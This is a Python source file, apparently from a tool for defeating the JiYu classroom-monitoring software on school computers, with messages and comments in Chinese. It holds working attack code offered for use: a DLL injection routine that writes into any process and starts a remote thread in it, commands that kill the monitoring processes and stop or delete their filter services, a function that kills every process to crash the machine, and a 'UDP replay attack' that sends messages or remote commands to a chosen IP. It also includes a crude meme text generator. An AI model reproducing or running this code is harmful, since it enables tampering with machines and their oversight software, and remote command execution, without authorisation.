from utils.shortcuts import *
from utils.imports import *
from utils.udpAttack import *

# 函数快速调用区
class windowOperation:
    
    def pin(windowTitle):
        try:
            hwnd = win32gui.FindWindow(None, windowTitle)    #获取所有窗口句柄 
            # hwnd = win32gui.FindWindow('xx.exe', None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
            # ctypes.windll.user32.ShowWindow(hwnd, 3)
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
            win32con.SWP_NOMOVE | win32con.SWP_NOACTIVATE | win32con.SWP_NOOWNERZORDER | win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE)
            # 取消置顶
            # win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
            if __name__ == '__main__':
                pass
        except Exception:
            print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")

    def unpin(windowTitle):
        try:
            hwnd = win32gui.FindWindow(None, windowTitle)    #获取所有窗口句柄 
            # hwnd = win32gui.FindWindow('xx.exe', None)
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWNORMAL)
            # ctypes.windll.user32.ShowWindow(hwnd, 3)
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
            win32con.SWP_NOMOVE | win32con.SWP_NOACTIVATE | win32con.SWP_NOOWNERZORDER | win32con.SWP_SHOWWINDOW | win32con.SWP_NOSIZE)
            # 取消置顶
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,win32con.SWP_SHOWWINDOW|win32con.SWP_NOSIZE|win32con.SWP_NOMOVE)
            if __name__ == '__main__':
                pass
        except Exception:
            print("\n[!] 执行出现错误。请检查窗口标题是否正确后重试。")


class processOperation:
    def inject(pid, dll_path):
        print("")

        PAGE_READWRITE = 0x04
        PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
        VIRTUAL_MEM = ( 0x1000 | 0x2000 )

        kernel32 = windll.kernel32
        dll_len = len(dll_path)

        # 获取句柄
        h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

        if not h_process:
            print ("[!] 无法获取此PID的句柄: %s" %(pid))
            print ("[!] 请确认PID: %s 有效。" %(pid))

        # 分配内存
        arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

        # 注入DLL
        written = c_int(0)  
        kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

        # Resolve LoadLibraryA Address
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

        thread_id = c_ulong(0)

        if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
            print ("[!] 注入失败，正在退出...")

        print ("[+] 成功创建远程进程 0x%08x." %(thread_id.value))


class svcOperation:
    def killNetFilter():
        run("taskkill /f /im GATESRV.exe >nul 2>nul")
        run("taskkill /f /im MasterHelper.exe >nul 2>nul")
        run("sc stop TDNetFilter >nul 2>nul")
        print("\n[+] 执行完成。极域网络滤网已被关闭。")
    def killFileFilter():
        run("sc stop TDFileFilter >nul 2>nul")
        run("sc delete TDFileFilter >nul 2>nul")
        print("\n[+] 执行完成。极域文件控制服务已被卸载。")


class sysOperation:
    def BSOD():
        run('"taskkill /f /fi "pid ne 1"')
    

class homochatter:
    def run(inputNum):
        print("\033c", end="")

        part1 = ["你是一个一个一个","食","我事","脱出","快点端上来罢","我在撅homochatter的时候，","十分甚至九分","兄啊，","戳啦，","wxy撅","sd食","五班事","这这布隆……","哼，哼，哼，"]
        part2 = ["恶臭的","撅撅子的","都是男的","正撅的","中出的","一针见雪的","homosexual","脱出的","食雪的","急不可耐的","小鬼的","自裁的","114514的"]
        part3 = ["……有什么存在的必要吗","我等不及力","野獣先辈","——淳平","？我修院！","快点端上来罢","快点端下去罢","啊啊啊啊啊啊啊啊啊啊啊啊","雪崩","极霸矛嘛","你有在偷看罢？","1919810"]
        emotion = ["（喜","（悲","（恼","（疑惑","（智将","（大喜","（全恼","（无慈悲","（确信","（直球","（警撅","（并感","（乐","（半恼","（）", "（心虚", "（意味深"]
        tips = ["猜猜最多可以输入几位数（喜", "HomoChatter的开发者头发已经只剩十根甚至是九根力（悲", "震惊！今日一名为HomoChatter的人机聊天软件成功通过图灵测试！", "冷知识：输入的不是整数不会真的被撅（心虚", "我现在就要和HomoChatter聊天，三回啊三回", "假如HomoChatter在Github上开源会发生什么？", "据报道，我校homo浓度已达到惊人的114%", "学校食堂的秘制酱料面很好吃，赶紧去尝尝（喜", "homo特色社会主义", "近日，两学生在教室里公然开撅"]

        撅=input
        脱出=print
        rc=random.choice

        try:
            inputnum=int(inputNum)
        except ValueError:
            print("[!] 输入整数，再乱输小心被撅（恼")  

        random.seed(inputnum + random.randint(0, 114514))
    
        脱出("\n==================================================")
        脱出(rc(part1),sep="",end="")
        脱出(rc(part2),sep="",end="")
        脱出(rc(part3),sep="",end="")
        脱出(rc(emotion),sep="",end="\n")
        脱出("==================================================\n")
        脱出("Tip: ", tips[random.randint(0, 9)],sep="",end="\n")
        脱出("\n", sep="",end="")
        run("pause>nul")
        
        run("cls")


# 结束JiYu主程序
def func1():
    kill("StudentMain.exe")
    print("\n[+] 执行完成。")
    
def func2_1():
    pinTarget = ''
    pinTarget = input("\n请输入你要置顶的窗口标题: \n>> ")
    windowOperation.pin(pinTarget)
    
def func2_2():
    pinTarget = ''
    pinTarget = input("\n请输入你要取消置顶的窗口标题: \n>> ")
    windowOperation.unpin(pinTarget)
    
def disableJiyuPin():
    pinTarget = 'Classin'
    windowOperation.unpin(pinTarget)
    
def func3():
    injectTarget = ''
    injectTarget = input("\n请输入你要注入的程序PID: \n>> ")
    injectDLL = input("\n请输入你要注入的DLL文件地址: \n>> ")
    processOperation.inject(injectTarget, injectDLL)
    
def func4():
    print("\n你确定要立即使电脑蓝屏吗？按下任意键继续，直接关闭程序来取消！")
    run('pause>nul')
    sysOperation.BSOD()
    
def func5():
    print('\n')
    svcOperation.killNetFilter()
    print("[i] 执行完毕。")
    
def func6():
    print('\n')
    svcOperation.killFileFilter()
    print("[i] 执行完毕。")
    
def func114514():
    inputnum = ""
    inputnum = input("\n撅入一个整数：\n>> ")
    # homochatter.roar()
    homochatter.run(inputnum)
    
def funcX():
    
    cls()
    print('\n---- UDP 重放攻击 ----')
    print('警告：如果你不知道你在干什么，请立即退出该功能，\n作者不为此程序造成的任何后果负责。')
    

    targetIP = input("\n请指定目标IP\n>> ")
    targetPort = input("\n请指定目标端口(默认4705)\n>> ")
    attackType = input('\n请指定一种攻击类型\n(1:发送消息 2:远程命令)\n>> ')
    attackContent = input('\n请输入发送内容\n>> ')    
    sendType = ''
    
    if attackType == 1:
        sendType = '-msg'
    if attackType == 2:
        sendType = '-c'

    sendContent = pkg_sendlist(sendType, attackContent)
    
    send_list = []
    send_list.append(sendContent)
    
    print("\n按下任意键发起攻击。")
    system('pause>nul')
    print("")
    
    try:
        send(send_list, targetIP, int(1), int(0), int(targetPort))
    except Exception as e:
        print("[!]", e)